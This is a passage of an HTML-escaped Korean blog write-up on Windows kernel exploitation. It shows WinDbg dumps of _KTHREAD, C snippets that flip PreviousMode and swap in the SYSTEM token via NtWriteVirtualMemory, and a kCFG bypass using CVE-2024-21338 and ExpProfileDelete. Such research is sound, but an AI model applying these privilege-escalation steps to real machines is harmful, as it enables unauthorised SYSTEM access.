&amp;#xD560;&amp;#xAC81;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%205.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xBA74; &amp;#xD604;&amp;#xC7AC; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xC758; KTHREAD/EPROCESS &amp;#xC8FC;&amp;#xC18C;&amp;#xC640; SYSTEM &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4; EPROCESS &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xCD9C;&amp;#xB825;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xAC78; &amp;#xBCF5;&amp;#xC0AC;&amp;#xD574;&amp;#xB450;&amp;#xACE0; windbg&amp;#xB85C; &amp;#xAC11;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;: kd&amp;gt; dt _KTHREAD FFFFDC0FC3780080
nt!_KTHREAD
   +&lt;span class=&#34;hljs-number&#34;&gt;0x000&lt;/span&gt; Header           : _DISPATCHER_HEADER
   +&lt;span class=&#34;hljs-number&#34;&gt;0x018&lt;/span&gt; SListFaultAddress : (null) 
   +&lt;span class=&#34;hljs-number&#34;&gt;0x020&lt;/span&gt; QuantumTarget    : &lt;span class=&#34;hljs-number&#34;&gt;0x8ad5b1e&lt;/span&gt;
   +&lt;span class=&#34;hljs-number&#34;&gt;0x028&lt;/span&gt; InitialStack     : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;7c30 Void
   +&lt;span class=&#34;hljs-number&#34;&gt;0x030&lt;/span&gt; StackLimit       : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;1000 Void
   +&lt;span class=&#34;hljs-number&#34;&gt;0x038&lt;/span&gt; StackBase        : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;8000 Void
   +&lt;span class=&#34;hljs-number&#34;&gt;0x040&lt;/span&gt; ThreadLock       : &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
   +&lt;span class=&#34;hljs-number&#34;&gt;0x048&lt;/span&gt; CycleTime        : &lt;span class=&#34;hljs-number&#34;&gt;0x4bf645c&lt;/span&gt;
   +&lt;span class=&#34;hljs-number&#34;&gt;0x050&lt;/span&gt; CurrentRunTime   : &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
   +&lt;span class=&#34;hljs-number&#34;&gt;0x054&lt;/span&gt; ExpectedRunTime  : &lt;span class=&#34;hljs-number&#34;&gt;0xbe0b&lt;/span&gt;
   +&lt;span class=&#34;hljs-number&#34;&gt;0x058&lt;/span&gt; KernelStack      : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;7000 Void
   +&lt;span class=&#34;hljs-number&#34;&gt;0x060&lt;/span&gt; StateSaveArea    : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;7c80 _XSAVE_FORMAT
...
   +&lt;span class=&#34;hljs-number&#34;&gt;0x220&lt;/span&gt; Process          : &lt;span class=&#34;hljs-number&#34;&gt;0xffffdc0f&lt;/span&gt;`c39640c0 _KPROCESS
   +&lt;span class=&#34;hljs-number&#34;&gt;0x228&lt;/span&gt; UserAffinity     : &lt;span class=&#34;hljs-number&#34;&gt;0xffffdc0f&lt;/span&gt;`c3780a68 _KAFFINITY_EX
   +&lt;span class=&#34;hljs-number&#34;&gt;0x230&lt;/span&gt; UserAffinityPrimaryGroup : &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
   +&lt;span class=&#34;hljs-number&#34;&gt;0x232&lt;/span&gt; PreviousMode     : &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;&amp;apos;&lt;/span&gt;
   +0x233 BasePriority     : 8 &amp;apos;&amp;apos;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%206.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;KTHREAD+0x232&lt;/code&gt; &amp;#xC704;&amp;#xCE58;&amp;#xC5D0; PreviouMode&amp;#xAC00; &amp;#xC704;&amp;#xCE58;&amp;#xD55C; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD604;&amp;#xC7AC; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xB294; &amp;#xC720;&amp;#xC800;&amp;#xBAA8;&amp;#xB4DC;&amp;#xC774;&amp;#xB2C8; PreviouMode&amp;#xAC00; 1&amp;#xC778; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB124;&amp;#xC694;. &amp;#xC774;&amp;#xC81C; windbg&amp;#xC758; Memory &amp;#xCC3D;&amp;#xC5D0;&amp;#xC11C; &amp;#xD574;&amp;#xB2F9; &amp;#xAC12;&amp;#xC744; 0&amp;#xC73C;&amp;#xB85C; &amp;#xC218;&amp;#xC815;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%207.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;: kd&amp;gt; dt _KTHREAD FFFFDC0FC3780080
nt!_KTHREAD
   +&lt;span class=&#34;hljs-number&#34;&gt;0x000&lt;/span&gt; Header           : _DISPATCHER_HEADER
   +&lt;span class=&#34;hljs-number&#34;&gt;0x018&lt;/span&gt; SListFaultAddress : (null) 
   +&lt;span class=&#34;hljs-number&#34;&gt;0x020&lt;/span&gt; QuantumTarget    : &lt;span class=&#34;hljs-number&#34;&gt;0x8ad5b1e&lt;/span&gt;
   +&lt;span class=&#34;hljs-number&#34;&gt;0x028&lt;/span&gt; InitialStack     : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;7c30 Void
   +&lt;span class=&#34;hljs-number&#34;&gt;0x030&lt;/span&gt; StackLimit       : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;1000 Void
   +&lt;span class=&#34;hljs-number&#34;&gt;0x038&lt;/span&gt; StackBase        : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;8000 Void
   +&lt;span class=&#34;hljs-number&#34;&gt;0x040&lt;/span&gt; ThreadLock       : &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
   +&lt;span class=&#34;hljs-number&#34;&gt;0x048&lt;/span&gt; CycleTime        : &lt;span class=&#34;hljs-number&#34;&gt;0x4bf645c&lt;/span&gt;
   +&lt;span class=&#34;hljs-number&#34;&gt;0x050&lt;/span&gt; CurrentRunTime   : &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
   +&lt;span class=&#34;hljs-number&#34;&gt;0x054&lt;/span&gt; ExpectedRunTime  : &lt;span class=&#34;hljs-number&#34;&gt;0xbe0b&lt;/span&gt;
   +&lt;span class=&#34;hljs-number&#34;&gt;0x058&lt;/span&gt; KernelStack      : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;7000 Void
   +&lt;span class=&#34;hljs-number&#34;&gt;0x060&lt;/span&gt; StateSaveArea    : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;7c80 _XSAVE_FORMAT
...
   +&lt;span class=&#34;hljs-number&#34;&gt;0x220&lt;/span&gt; Process          : &lt;span class=&#34;hljs-number&#34;&gt;0xffffdc0f&lt;/span&gt;`c39640c0 _KPROCESS
   +&lt;span class=&#34;hljs-number&#34;&gt;0x228&lt;/span&gt; UserAffinity     : &lt;span class=&#34;hljs-number&#34;&gt;0xffffdc0f&lt;/span&gt;`c3780a68 _KAFFINITY_EX
   +&lt;span class=&#34;hljs-number&#34;&gt;0x230&lt;/span&gt; UserAffinityPrimaryGroup : &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
   +&lt;span class=&#34;hljs-number&#34;&gt;0x232&lt;/span&gt; PreviousMode     : &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;&amp;apos;&lt;/span&gt;
   +0x233 BasePriority     : 8 &amp;apos;&amp;apos;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xB2E4;&amp;#xC2DC; &amp;#xBD84;&amp;#xC11D; &amp;#xBA38;&amp;#xC2E0;&amp;#xC73C;&amp;#xB85C; &amp;#xB3CC;&amp;#xC544;&amp;#xC640; &amp;#xC544;&amp;#xBB34; &amp;#xBC84;&amp;#xD2BC;&amp;#xC774;&amp;#xB098; &amp;#xB204;&amp;#xB974;&amp;#xBA74; &amp;#xB2E4;&amp;#xC74C; &amp;#xC2A4;&amp;#xD15D;&amp;#xC744; &amp;#xC9C4;&amp;#xD589;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)EPROCESS + &lt;span class=&#34;hljs-number&#34;&gt;0x4b8&lt;/span&gt; , (ULONGLONG)SYSTEM_EPROCESS + &lt;span class=&#34;hljs-number&#34;&gt;0x4b8&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(ULONGLONG), &amp;amp;dwbytes);
system(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;cmd.exe&amp;quot;&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;PreviousMode &amp;#xBCC0;&amp;#xC870;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;pNtWritevirtualMemory&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB85C; &amp;#xCEE4;&amp;#xB110; Read/Write&amp;#xAC00; &amp;#xAC00;&amp;#xB2A5;&amp;#xD574;&amp;#xC84C;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C; EPROCESS&amp;#xC758; Token&amp;#xC73C;&amp;#xB85C; Token Swapping&amp;#xC744; &amp;#xD55C; &amp;#xB4A4; cmd &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xBA74; NT AUTORITY\SYSTEM &amp;#xAD8C;&amp;#xD55C;&amp;#xC758; cmd&amp;#xAC00;&amp;#x2026;!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%208.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;?&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%209.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;BSOD&amp;#xAC00; &amp;#xB5A0;&amp;#xBC84;&amp;#xB838;&amp;#xB124;&amp;#xC694;.. ??&lt;/p&gt;
&lt;p&gt;&amp;#xBB38;&amp;#xC81C;&amp;#xB294; PreviousMode&amp;#xB97C; &amp;#xCEE4;&amp;#xB110;&amp;#xBAA8;&amp;#xB4DC;&amp;#xB85C; &amp;#xBCC0;&amp;#xC870;&amp;#xD55C; &amp;#xB4A4; &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C; &amp;#xAD8C;&amp;#xD55C;&amp;#xC73C;&amp;#xB85C; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xB97C; &amp;#xC0DD;&amp;#xC131;&amp;#xD558;&amp;#xB824;&amp;#xACE0; &amp;#xD560; &amp;#xB54C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. Token Swapping&amp;#xC744; &amp;#xD55C; &amp;#xC774;&amp;#xD6C4;&amp;#xC5D0;&amp;#xB294; &amp;#xCEE4;&amp;#xB110;&amp;#xBAA8;&amp;#xB4DC; PreviousMode&amp;#xAC00; &amp;#xD544;&amp;#xC694; &amp;#xC5C6;&amp;#xC73C;&amp;#xB2C8; cmd &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4; &amp;#xC0DD;&amp;#xC131; &amp;#xC804;&amp;#xC5D0; &amp;#xC6D0;&amp;#xB798; &amp;#xAC12;&amp;#xC778; 1&amp;#xB85C; &amp;#xBCF5;&amp;#xC6D0;&amp;#xD558;&amp;#xB294; &amp;#xACFC;&amp;#xC815;&amp;#xC774; &amp;#xC788;&amp;#xC5B4;&amp;#xC57C; &amp;#xD06C;&amp;#xB798;&amp;#xC2DC;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xACE0; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xB97C; &amp;#xC0DD;&amp;#xC131;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;* restoreBuffer = (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;*)&lt;span class=&#34;hljs-built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(CHAR));
*restoreBuffer = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;

pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)KTHREAD + &lt;span class=&#34;hljs-number&#34;&gt;0x232&lt;/span&gt;, (PVOID)restoreBuffer, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(CHAR), &amp;amp;dwbytes);
system(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;cmd.exe&amp;quot;&lt;/span&gt;);&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC704; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xCD94;&amp;#xAC00;&amp;#xD574; &amp;#xB2E4;&amp;#xC2DC; &amp;#xD574;&amp;#xBCF4;&amp;#xBA74;..&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%2010.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xB807;&amp;#xAC8C; PreviousMode &amp;#xBCC0;&amp;#xC870;&amp;#xB85C; &amp;#xAD8C;&amp;#xD55C; &amp;#xC0C1;&amp;#xC2B9;&amp;#xC744; &amp;#xB2EC;&amp;#xC131;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB2E4;&amp;#xC2DC; kCFG &amp;#xC6B0;&amp;#xD68C;&amp;#xB85C; &amp;#xB3CC;&amp;#xC544;&amp;#xC640;&amp;#xC11C;, CVE-2024-21338&amp;#xC758; untrusted pointer dereference &amp;#xCDE8;&amp;#xC57D;&amp;#xC810; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70; &amp;#xD6C4; kCFG &amp;#xBE44;&amp;#xD2B8;&amp;#xB9F5;&amp;#xC5D0; &amp;#xB4F1;&amp;#xB85D;&amp;#xB41C; &amp;#xC815;&amp;#xC0C1;&amp;#xC801;&amp;#xC778; &amp;#xCEE4;&amp;#xB110; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xBA74; PreviouMode&amp;#xB97C; &amp;#xBCC0;&amp;#xC870;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xACA0;&amp;#xC8E0;. &amp;#xADFC;&amp;#xB370;.. &amp;#xB9CE;&amp;#xACE0; &amp;#xB9CE;&amp;#xC740; &amp;#xCEE4;&amp;#xB110; &amp;#xD568;&amp;#xC218; &amp;#xC911; &amp;#xC774;&amp;#xB7F0; &amp;#xD568;&amp;#xC218;&amp;#xB294; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &amp;#xCC3E;&amp;#xC544;&amp;#xC57C; &amp;#xD560;&amp;#xAE4C;&amp;#xC694; :(&lt;/p&gt;
&lt;p&gt;&amp;#xC8FC;&amp;#xBAA9;&amp;#xD574;&amp;#xBCFC;&amp;#xB9CC;&amp;#xD55C; &amp;#xD568;&amp;#xC218; &amp;#xC911; &lt;code&gt;ObfDereferenceObjectWithTag&lt;/code&gt; &amp;#xCEE4;&amp;#xB110; &amp;#xB9E4;&amp;#xD06C;&amp;#xB85C;&amp;#xAC00; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD574;&amp;#xB2F9; &amp;#xB9E4;&amp;#xD06C;&amp;#xB85C;&amp;#xB294; &amp;#xC804;&amp;#xB2EC;&amp;#xB418;&amp;#xB294; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8; &amp;#xC8FC;&amp;#xC18C;&amp;#xC758; &amp;#xB808;&amp;#xD37C;&amp;#xB7F0;&amp;#xC2A4; &amp;#xCE74;&amp;#xC6B4;&amp;#xD2B8; &amp;#xD544;&amp;#xB4DC;(&amp;#xC624;&amp;#xD504;&amp;#xC14B; -0x30) &amp;#xB97C; &amp;#xAC10;&amp;#xC18C;&amp;#xC2DC;&amp;#xD0A4;&amp;#xBBC0;&amp;#xB85C; PreviousMode&amp;#xC758; &amp;#xC720;&amp;#xC800;&amp;#xBAA8;&amp;#xB4DC; &amp;#xAC12;&amp;#xC778; 1&amp;#xC5D0;&amp;#xC11C; &amp;#xCEE4;&amp;#xB110;&amp;#xBAA8;&amp;#xB4DC; &amp;#xAC12;&amp;#xC778; 0&amp;#xC73C;&amp;#xB85C; &amp;#xBCC0;&amp;#xC870;&amp;#xD558;&amp;#xAE30; &amp;#xB531; &amp;#xC88B;&amp;#xC740; &amp;#xB9E4;&amp;#xD06C;&amp;#xB85C;&amp;#xAC00; &amp;#xB418;&amp;#xACA0;&amp;#xB124;&amp;#xC694;.&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB7EC;&amp;#xB098; &lt;code&gt;ObfDereferenceObjectWithTag&lt;/code&gt; &amp;#xC744; &amp;#xBC14;&amp;#xB85C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xAE30;&amp;#xC5D0;&amp;#xB294; &amp;#xD55C; &amp;#xAC00;&amp;#xC9C0; &amp;#xC81C;&amp;#xC57D;&amp;#xC0AC;&amp;#xD56D;&amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC544;&amp;#xAE4C; &amp;#xBC84;&amp;#xADF8; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70; &amp;#xC2DC;&amp;#xC810;&amp;#xC5D0;&amp;#xC11C; &amp;#xD655;&amp;#xC778;&amp;#xD588;&amp;#xB358; &amp;#xAC83;&amp;#xCC98;&amp;#xB7FC; &amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790; &amp;#xAC12;&amp;#xC744; &amp;#xC9C1;&amp;#xC811; &amp;#xC81C;&amp;#xC5B4;&amp;#xD560; &amp;#xC218;&amp;#xB294; &amp;#xC5C6;&amp;#xACE0;, &amp;#xC778;&amp;#xC790;&amp;#xAC00; &amp;#xCC38;&amp;#xC870;&amp;#xD558;&amp;#xB294; &amp;#xAC12;&amp;#xB9CC; &amp;#xAC04;&amp;#xC811;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xC81C;&amp;#xC5B4;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB2E4;&amp;#xB294; &amp;#xAC83;&amp;#xC774;&amp;#xC8E0;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%203.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;rcx&amp;#xB97C; &amp;#xD55C; &amp;#xBC88; &amp;#xCC38;&amp;#xC870;&amp;#xD55C; &amp;#xAC12;&amp;#xC744; &lt;code&gt;ObfDereferenceObjectWithTag&lt;/code&gt; &amp;#xB9E4;&amp;#xD06C;&amp;#xB85C;&amp;#xC758; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &amp;#xC804;&amp;#xB2EC;&amp;#xD574; &amp;#xC6B0;&amp;#xB9AC;&amp;#xAC00; &amp;#xC9C1;&amp;#xC811; &amp;#xC81C;&amp;#xC5B4; &amp;#xAC00;&amp;#xB2A5;&amp;#xD558;&amp;#xB3C4;&amp;#xB85D; &amp;#xD558;&amp;#xB294;  wrapper &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xB610; &amp;#xCC3E;&amp;#xC544;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ObfDereferenceObjectWithTag&lt;/code&gt; &amp;#xB9E4;&amp;#xD06C;&amp;#xB85C;&amp;#xC758; &amp;#xD06C;&amp;#xB85C;&amp;#xC2A4; &amp;#xB808;&amp;#xD37C;&amp;#xB7F0;&amp;#xC2A4; &amp;#xB9AC;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB97C; &amp;#xCB49; &amp;#xCC3E;&amp;#xC544;&amp;#xBCF4;&amp;#xBA74; &amp;#xD574;&amp;#xB2F9; &amp;#xC870;&amp;#xAC74;&amp;#xC744; &amp;#xB9CC;&amp;#xC871;&amp;#xD558;&amp;#xB294; &lt;code&gt;ExpProfileDelete&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs lua&#34;&gt;void __fastcall ExpProfileDelete(__int64 a1)
{
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( *(_QWORD *)(a1 + &lt;span class=&#34;hljs-number&#34;&gt;48&lt;/span&gt;) )
  {
    KeStopProfile(*(_QWORD *)(a1 + &lt;span class=&#34;hljs-number&#34;&gt;40&lt;/span&gt;));
    MmUnmapLockedPages(*(PVOID *)(a1 + &lt;span class=&#34;hljs-number&#34;&gt;48&lt;/span&gt;), *(PMDL *)(a1 + &lt;span class=&#34;hljs-number&#34;&gt;56&lt;/span&gt;));
    MmUnlockPages(*(PMDL *)(a1 + &lt;span class=&#34;hljs-number&#34;&gt;56&lt;/span&gt;));
    ExFreePoolWithTag(*(PVOID *)(a1 + &lt;span class=&#34;hljs-number&#34;&gt;40&lt;/span&gt;), &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( *(_QWORD *)a1 )
    ObfDereferenceObjectWithTag(*(PVOID *)a1, &lt;span class=&#34;hljs-number&#34;&gt;0x66507845&lt;/span&gt;u);
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790;&amp;#xB97C; &amp;#xCC38;&amp;#xC870;&amp;#xD55C; &amp;#xAC12;&amp;#xC744; &lt;code&gt;ObfDereferenceObjectWithTag&lt;/code&gt;&amp;#xB85C; &amp;#xC804;&amp;#xB2EC;&amp;#xD574; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB124;&amp;#xC694;. &amp;#xC774;&amp;#xB7EC;&amp;#xBA74; &amp;#xB9E4;&amp;#xD06C;&amp;#xB85C;&amp;#xC758; &amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790;&amp;#xB97C; &amp;#xC6B0;&amp;#xB9AC;&amp;#xAC00; &amp;#xC9C1;&amp;#xC811; &amp;#xCEE8;&amp;#xD2B8;&amp;#xB864;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%2011.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC6B0;&amp;#xC120; CVE-2024-21338 &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;ExpProfileDelete&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xBA74; kCFG&amp;#xAC00; &amp;#xC6B0;&amp;#xD68C;&amp;#xB418;&amp;#xACE0; &lt;code&gt;ExpProfileDelete&lt;/code&gt; &amp;#xC8FC;&amp;#xC18C;&amp;#xB85C; &amp;#xC810;&amp;#xD504;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;ExpProfileDelete&lt;/code&gt; &amp;#xD568;&amp;#xC218; &amp;#xC8FC;&amp;#xC18C;&amp;#xB294; Part 1&amp;#xC758; &lt;code&gt;NtQuerySystemInformation&lt;/code&gt; &amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xAD6C;&amp;#xD55C; ntoskrnle.exe &amp;#xBCA0;&amp;#xC774;&amp;#xC2A4;&amp;#xC640; &amp;#xC624;&amp;#xD504;&amp;#xC14B; &amp;#xACC4;&amp;#xC0B0;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xAD6C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%2012.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ExpProfileDelete&lt;/code&gt; &amp;#xB0B4;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;ObfDereferenceObjectWithTag&lt;/code&gt; &amp;#xB9E4;&amp;#xD06C;&amp;#xB85C; &amp;#xD638;&amp;#xCD9C; &amp;#xC2DC;&amp;#xC810;&amp;#xC758; rcx&amp;#xAC00; &lt;code&gt;0x4141414141414141&lt;/code&gt;&amp;#xB85C; &amp;#xB098;&amp;#xC624;&amp;#xB124;&amp;#xC694;. &amp;#xB4DC;&amp;#xB514;&amp;#xC5B4; &amp;#xC6B0;&amp;#xB9AC;&amp;#xAC00; &amp;#xC6D0;&amp;#xD558;&amp;#xB294; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xAC10;&amp;#xC18C;&amp;#xC2DC;&amp;#xD0AC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
